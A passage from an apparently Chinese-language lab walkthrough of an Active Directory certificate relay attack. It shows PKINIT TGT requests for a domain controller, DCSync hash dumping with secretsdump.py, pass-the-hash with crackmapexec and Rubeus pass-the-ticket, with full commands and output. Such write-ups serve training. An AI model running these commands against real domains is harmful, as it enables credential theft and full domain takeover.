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</span><br><span class="line">[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed</span><br><span class="line"></span><br><span class="line">&lt;SNIP&gt;</span><br></pre></td></tr></table></figure>

<h3 id="Request-TGT"><a href="#Request-TGT" class="headerlink" title="Request TGT"></a>Request TGT</h3><p>接下来，可以获取这个 base64 证书并用<code>gettgtpkinit.py</code>为域控制器请求票证授予票证 (TGT)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache</span><br><span class="line"></span><br><span class="line">2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file</span><br><span class="line">INFO:minikerberos:Loading certificate and key from file</span><br><span class="line">2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT</span><br><span class="line">INFO:minikerberos:Requesting TGT</span><br><span class="line">2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):</span><br><span class="line">INFO:minikerberos:AS-REP encryption key (you might need this later):</span><br><span class="line">2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275</span><br><span class="line">INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275</span><br><span class="line">2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file</span><br><span class="line">INFO:minikerberos:Saved TGT to file</span><br></pre></td></tr></table></figure>

<p>上面请求的 TGT 被保存到<code>dc01.ccache</code>文件中，用该文件设置 KRB5CCNAME 环境变量，因此攻击主机使用此文件进行 Kerberos 身份验证尝试。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ export KRB5CCNAME=dc01.ccache</span><br></pre></td></tr></table></figure>

<h3 id="DCSync-using-TGT"><a href="#DCSync-using-TGT" class="headerlink" title="DCSync using TGT"></a>DCSync using TGT</h3><h4 id="Impacket-secretsdump-py"><a href="#Impacket-secretsdump-py" class="headerlink" title="Impacket secretsdump.py"></a>Impacket secretsdump.py</h4><p>然后，可以使用这个 TGT<code>secretsdump.py</code>执行 DCSYnc 并检索域的一个或所有 NTLM 密码哈希。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass &quot;ACADEMY-EA-DC01$&quot;@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] Using the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f</span><br><span class="line">[*] Cleaning up... </span><br></pre></td></tr></table></figure>

<p>还可以使用更简单的命令：<code>secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</code>因为该工具将从 ccache 文件中检索用户名。可以通过输入<code>klist</code>来查看（使用该<code>klist</code>命令需要在攻击主机上安装<a target="_blank" rel="noopener" href="https://packages.ubuntu.com/focal/krb5-user">krb5-user</a>包。该包已安装在实验室中的 ATTACK01 上）。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ klist</span><br><span class="line"></span><br><span class="line">Ticket cache: FILE:dc01.ccache</span><br><span class="line">Default principal: ACADEMY-EA-DC01$@INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line">Valid starting       Expires              Service principal</span><br><span class="line">04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL</span><br></pre></td></tr></table></figure>

<p>最后，可以使用内置管理员帐户的 NT hash 来向域控制器进行身份验证。从这里开始，可以完全控制域，并可以尝试建立持久性、搜索敏感数据、查找报告的其他错误配置和漏洞，或者开始枚举信任关系。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf</span><br><span class="line"></span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)</span><br></pre></td></tr></table></figure>

<h4 id="PKINITtools-getnthash-py"><a href="#PKINITtools-getnthash-py" class="headerlink" title="PKINITtools getnthash.py"></a>PKINITtools getnthash.py</h4><p>还可以采取另一种方法。使用 PKINITtools 的工具<code>getnthash.py</code>，可以使用 Kerberos U2U 提交 TGS 请求，其中包含目标的 NT hash 的<a target="_blank" rel="noopener" href="https://stealthbits.com/blog/what-is-the-kerberos-pac/">特权属性证书 (PAC)，</a>从而请求目标主机&#x2F;用户的NT Hash。这可以使用之前请求 TGT 时获得的 AS-REP 加密密钥进行解密。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> python /opt/PKINITtools/getnthash.py <span class="literal">-key</span> <span class="number">70</span>f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275 INLANEFREIGHT.LOCAL/ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br><span class="line"></span><br><span class="line">Impacket v0.<span class="number">9.24</span>.dev1+<span class="number">20211013.152215</span>.<span class="number">3</span>fe2d73a - Copyright <span class="number">2021</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> TGT from cache</span><br><span class="line">[*] Requesting ticket to self with PAC</span><br><span class="line">Recovered NT Hash</span><br><span class="line"><span class="number">313</span>b6f423cd1ee07e91315b4919fb4ba</span><br></pre></td></tr></table></figure>

<h3 id="DCSync-1"><a href="#DCSync-1" class="headerlink" title="DCSync"></a>DCSync</h3><h4 id="NTLM-hash-for-DCSync"><a href="#NTLM-hash-for-DCSync" class="headerlink" title="NTLM hash for DCSync"></a>NTLM hash for DCSync</h4><p>使用此哈希通过 <code>-hashes</code>参数与 secretsdump.py 执行 DCSync。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$</span> secretsdump.py <span class="literal">-just-dc-user</span> INLANEFREIGHT/administrator <span class="string">&quot;ACADEMY-EA-DC01<span class="variable">$</span>&quot;</span>@<span class="number">172.16</span>.<span class="number">5.5</span> <span class="literal">-hashes</span> aad3c435b514a4eeaad3b935b51304fe:<span class="number">313</span>b6f423cd1ee07e91315b4919fb4ba</span><br><span class="line"></span><br><span class="line">Impacket v0.<span class="number">9.24</span>.dev1+<span class="number">20211013.152215</span>.<span class="number">3</span>fe2d73a - Copyright <span class="number">2021</span> SecureAuth Corporation</span><br><span class="line"></span><br><span class="line">[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)</span><br><span class="line">[*] <span class="keyword">Using</span> the DRSUAPI method to get NTDS.DIT secrets</span><br><span class="line">inlanefreight.local\administrator:<span class="number">500</span>:aad3b435b51404eeaad3b435b51404ee:<span class="number">88</span>ad09182de639ccc6579eb0849751cf:::</span><br><span class="line">[*] Kerberos keys grabbed</span><br><span class="line">inlanefreight.local\administrator:aes256<span class="literal">-cts-hmac-sha1-96</span>:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6</span><br><span class="line">inlanefreight.local\administrator:aes128<span class="literal">-cts-hmac-sha1-96</span>:<span class="number">95</span>c30f88301f9fe14ef5a8103b32eb25</span><br><span class="line">inlanefreight.local\administrator:des<span class="literal">-cbc-md5</span>:<span class="number">70</span>add6e02f70321f</span><br><span class="line">[*] Cleaning up...</span><br></pre></td></tr></table></figure>

<p>或者，一旦通过 ntlmrelayx.py 获得 base64 证书，就可以在 Windows 攻击主机上使用该证书和 Rubeus 工具来请求 TGT 票证并一次性执行传递票证 (PTT) 攻击。</p>
<p>注意：需要<code>MS01</code>在另一个部分中使用攻击主机，例如<code>ACL Abuse Tactics</code>或<code>Privileged Access</code>部分，一旦将 base64 证书保存到笔记中，就可以使用 Rubeus 执行此操作。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; .\Rubeus.exe asktgt /user:ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span> /certificate:MIIStQIBAzC...SNIP...IkHS2vJ51Ry4= /ptt</span><br><span class="line"></span><br><span class="line">   ______        _</span><br><span class="line">  (_____ \      | |</span><br><span class="line">   _____) )_   _| |__  _____ _   _  ___</span><br><span class="line">  |  __  /| | | |  _ \| ___ | | | |/___)</span><br><span class="line">  | |  \ \| |_| | |_) ) ____| |_| |___ |</span><br><span class="line">  |_|   |_|____/|____/|_____)____/(___/</span><br><span class="line"></span><br><span class="line">  v2.<span class="number">0.2</span></span><br><span class="line"></span><br><span class="line">[*] Action: Ask TGT</span><br><span class="line"></span><br><span class="line">[*] <span class="keyword">Using</span> PKINIT with e<span class="keyword">type</span> rc4_hmac and subject: CN=ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL</span><br><span class="line">[*] Building AS<span class="literal">-REQ</span> (w/ PKINIT preauth) <span class="keyword">for</span>: <span class="string">&#x27;INLANEFREIGHT.LOCAL\ACADEMY-EA-DC01$&#x27;</span></span><br><span class="line">[*] <span class="keyword">Using</span> domain controller: 172.16.5.5:88</span><br><span class="line">[+] TGT request successful!</span><br><span class="line"><span class="function">[*] <span class="title">base64</span></span>(ticket.kirbi):</span><br><span class="line"> doIGUDCCBkygAwIBBaEDAgEWooIFSDCCBURhggVAMIIFPKADAgEFoRUbE0lOTEFORUZSRUlHSFQuTE9D</span><br><span class="line">      QUyiKDAmoAMCAQKhHzAdGwZrcmJ0Z3QbE0lOTEFORUZSRUlHSFQuTE9DQUyjggTyMIIE7qADAgEXoQMC</span><br><span class="line">      AQKiggTgBIIE3IHVcI8Q7gEgvqZmbo2BFOclIQogbXr++rtdBdgL5MPlU2V15kXxx4vZaBRzBv6/e3MC</span><br><span class="line">      exXtfUDZce8olUa1oy901BOhQNRuW0d9efigvnpL1fz0QwgLC0gcGtfPtQxJLTpLYWcDyViNdncjj76P</span><br><span class="line">      IZJzOTbSXT1bNVFpM9YwXa/tYPbAFRAhr0aP49FkEUeRVoz2HDMre8gfN5y2abc5039Yf9zjvo78I/HH</span><br><span class="line">      NmLWni29T9TDyfmU/xh/qkldGiaBrqOiUqC19X7unyEbafC6vr9er+j77TlMV88S3fUD/f1hPYMTCame</span><br><span class="line">      svFXFNt5VMbRo3/wQ8+fbPNDsTF+NZRLTAGZOsEyTfNEfpw1nhOVnLKrPYyNwXpddOpoD58+DCU90FAZ</span><br><span class="line">      g69yH2enKv+dNT84oQUxE+<span class="number">9</span>gOFwKujYxDSB7g/<span class="number">2</span>PUsfUh7hKhv3OkjEFOrzW3Xrh98yHrg6AtrENxL89</span><br><span class="line">      CxOdSfj0HNrhVFgMpMepPxT5Sy2mX8WDsE1CWjckcqFUS6HCFwAxzTqILbO1mbNO9gWKhMPwyJDlENJq</span><br><span class="line">      WdmLFmThiih7lClG05xNt56q2EY3y/m8Tpq8nyPey580TinHrkvCuE2hLeoiWdgBQiMPBUe23NRNxPHE</span><br><span class="line">      PjrmxMU/HKr/BPnMobdfRafgYPCRObJVQynOJrummdx5scUWTevrCFZd+q3EQcnEyRXcvQJFDU3VVOHb</span><br><span class="line">      Cfp+IYd5AXGyIxSmena/+uynzuqARUeRl1x/q8jhRh7ibIWnJV8YzV84zlSc4mdX4uVNNidLkxwCu2Y4</span><br><span class="line">      K37BE6AWycYH7DjZEzCE4RSeRu5fy37M0u6Qvx7Y7S04huqy1Hbg0RFbIw48TRN6qJrKRUSKep1j19n6</span><br><span class="line">      h3hw9z4LN3iGXC4Xr6AZzjHzY5GQFaviZQ34FEg4xF/Dkq4R3abDj+RWgFkgIl0B5y4oQxVRPHoQ+<span class="number">60</span>n</span><br><span class="line">      CXFC5KznsKgSBV8Tm35l6RoFN5Qa6VLvb+P5WPBuo7F0kqUzbPdzTLPCfx8MXt46Jbg305QcISC/QOFP</span><br><span class="line">      T//e7l7AJbQ+GjQBaqY8qQXFD1Gl4tmiUkVMjIQrsYQzuL6D3Ffko/OOgtGuYZu8yO9wVwTQWAgbqEbw</span><br><span class="line">      T2xd+SRCmElUHUQV0eId1lALJfE1DC/<span class="number">5</span>w0++<span class="number">2</span>srQTtLA4LHxb3L5dalF/fCDXjccoPj0+Q+vJmty0XGe</span><br><span class="line">      +Dz6GyGsW8eiE7RRmLi+IPzL2UnOa4CO5xMAcGQWeoHT0hYmLdRcK9udkO6jmWi4OMmvKzO0QY6xuflN</span><br><span class="line">      hLftjIYfDxWzqFoM4d3E1x/Jz4aTFKf4fbE3PFyMWQq98lBt3hZPbiDb1qchvYLNHyRxH3VHUQOaCIgL</span><br><span class="line">      /vpppveSHvzkfq/<span class="number">3</span>ft1gca6rCYx9Lzm8LjVosLXXbhXKttsKslmWZWf6kJ3Ym14nJYuq7OClcQzZKkb3</span><br><span class="line">      EPovED0+mPyyhtE8SL0rnCxy1XEttnusQfasac4Xxt5XrERMQLvEDfy0mrOQDICTFH9gpFrzU7d2v87U</span><br><span class="line">      HDnpr2gGLfZSDnh149ZVXxqe9sYMUqSbns6+UOv6EW3JPNwIsm7PLSyCDyeRgJxZYUl4XrdpPHcaX71k</span><br><span class="line">      ybUAsMd3PhvSy9HAnJ/tAew3+t/CsvzddqHwgYBohK+eg0LhMZtbOWv7aWvsxEgplCgFXS18o4HzMIHw</span><br><span class="line">      oAMCAQCigegEgeV9geIwgd+ggdwwgdkwgdagGzAZoAMCARehEgQQd/AohN1w1ZZXsks8cCUlbqEVGxNJ</span><br><span class="line">      TkxBTkVGUkVJR0hULkxPQ0FMoh0wG6ADAgEBoRQwEhsQQUNBREVNWS1FQS1EQzAxJKMHAwUAQOEAAKUR</span><br><span class="line">      GA8yMDIyMDMzMDIyNTAyNVqmERgPMjAyMjAzMzEwODUwMjVapxEYDzIwMjIwNDA2MjI1MDI1WqgVGxNJ</span><br><span class="line">      TkxBTkVGUkVJR0hULkxPQ0FMqSgwJqADAgECoR8wHRsGa3JidGd0GxNJTkxBTkVGUkVJR0hULkxPQ0FM</span><br><span class="line">[+] Ticket successfully imported!</span><br><span class="line"></span><br><span class="line">  ServiceName              :  krbtgt/INLANEFREIGHT.LOCAL</span><br><span class="line">  ServiceRealm             :  INLANEFREIGHT.LOCAL</span><br><span class="line">  UserName                 :  ACADEMY<span class="literal">-EA-DC01</span><span class="variable">$</span></span><br><span class="line">  UserRealm                :  INLANEFREIGHT.LOCAL</span><br><span class="line">  StartTime                :  <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">50</span>:<span class="number">25</span> PM</span><br><span class="line">  EndTime                  :  <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> AM</span><br><span class="line">  RenewTill                :  <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">3</span>:<span class="number">50</span>:<span class="number">25</span> PM</span><br><span class="line">  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable</span><br><span class="line">  KeyType                  :  rc4_hmac</span><br><span class="line">  Base64(key)              :  d/AohN1w1ZZXsks8cCUlbg==</span><br><span class="line">  ASREP (key)              :  <span class="number">2</span>A621F62C32241F38FA68826E95521DD</span><br></pre></td></tr></table></figure>

<p>然后可以输入内容<code>klist</code>来确认该票已在内存中。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Tools&gt; klist</span><br><span class="line"></span><br><span class="line">Current LogonId is <span class="number">0</span>:<span class="number">0</span>x4e56b</span><br><span class="line"></span><br><span class="line">Cached Tickets: (<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#0&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x60a10000 -&gt; forwardable forwarded renewable pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">53</span>:<span class="number">09</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x2 -&gt; DELEGATION</span><br><span class="line">        Kdc Called: ACADEMY<span class="literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL</span><br><span class="line"></span><br><span class="line"><span class="comment">#1&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: krbtgt/INLANEFREIGHT.LOCAL <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40e10000 -&gt; forwardable renewable initial pre_authent name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span class="number">3</span>/<span class="number">30</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        <span class="keyword">End</span> Time:   <span class="number">3</span>/<span class="number">31</span>/<span class="number">2022</span> <span class="number">1</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Renew Time: <span class="number">4</span>/<span class="number">6</span>/<span class="number">2022</span> <span class="number">15</span>:<span class="number">50</span>:<span class="number">25</span> (local)</span><br><span class="line">        Session Key <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Cache Flags: <span class="number">0</span>x1 -&gt; PRIMARY</span><br><span class="line">        Kdc Called:</span><br><span class="line"></span><br><span class="line"><span class="comment">#2&gt;     Client: ACADEMY-EA-DC01$ @ INLANEFREIGHT.LOCAL</span></span><br><span class="line">        Server: cifs/academy<span class="literal">-ea-dc01</span> <span class="selector-tag">@</span> INLANEFREIGHT.LOCAL</span><br><span class="line">        KerbTicket Encryption <span class="built_in">Type</span>: RSADSI RC4<span class="literal">-HMAC</span>(NT)</span><br><span class="line">        Ticket Flags <span class="number">0</span>x40a50000 -&gt; forwardable renewable pre_authent ok_as_delegate name_canonicalize</span><br><span class="line">        <span class="built_in">Start</span> Time: <span 